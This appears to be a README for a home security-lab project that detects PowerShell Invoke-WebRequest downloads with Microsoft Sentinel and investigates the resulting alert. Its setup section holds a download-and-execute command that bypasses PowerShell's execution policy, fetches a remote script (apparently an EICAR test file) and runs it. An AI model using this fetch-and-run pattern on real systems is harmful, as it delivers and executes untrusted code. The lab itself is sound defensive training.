## ðŸ§¾ Explanation
Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet.

## ðŸ“Œ Project Objective
> Detect and investigate the use of PowerShell's `Invoke-WebRequest` for downloading files from the internetâ€”an activity often used by attackers during post-exploitation phases. This scenario involves creating an analytics rule in Sentinel and working the resulting incident to closure using the NIST 800-61 framework.

## ðŸ§° Tools & Technologies
- **Platform:** Azure
- **OS:** Windows 10
- **Tools:** Microsoft Sentinel, Microsoft Defender for Endpoint, PowerShell
- **Languages/Scripts:** PowerShell, KQL

---

## ðŸ§  Skills Gained / Focus Areas
- Detected use of `Invoke-WebRequest` via process telemetry
- Created a Sentinel alert rule to detect suspicious PowerShell usage
- Investigated execution of downloaded scripts
- Applied entity mapping and incident triage methodology

---

## ðŸ§ª Environment Setup
> Onboarded Windows 10 VM to Microsoft Defender for Endpoint. Ran the following command to simulate malicious activity:
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
